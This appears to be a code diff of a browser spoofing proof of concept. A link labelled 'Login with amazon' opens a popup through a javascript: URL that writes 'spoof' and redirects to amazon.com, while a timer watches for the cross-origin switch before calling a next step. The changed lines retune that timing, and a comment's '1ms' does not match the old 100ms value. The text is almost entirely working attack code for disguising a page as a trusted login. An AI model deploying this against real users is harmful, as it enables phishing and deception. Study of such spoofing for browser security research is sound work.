@@ -3,10 +3,22 @@
          w.location.replace('http://www.google.com/csi');
         }
 
-  function f() {
-    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 100); 
-  }
+function f() {
+    w = window.open("javascript:document.write('spoof');setTimeout(function(){location='http://amazon.com'}, 100)","new","width=500 height=500");
+    
+    // Check every 500ms instead of 1ms
+    i = setInterval(function() {
+        try {
+            if (w.closed) {
+                clearInterval(i);
+                next();
+            }
+        } catch(e) {
+            clearInterval(i);
+            next();
+        }
+    }, 500);
+}
 </script>
 
 <a href="#" onclick="f()">Login with amazon</a>
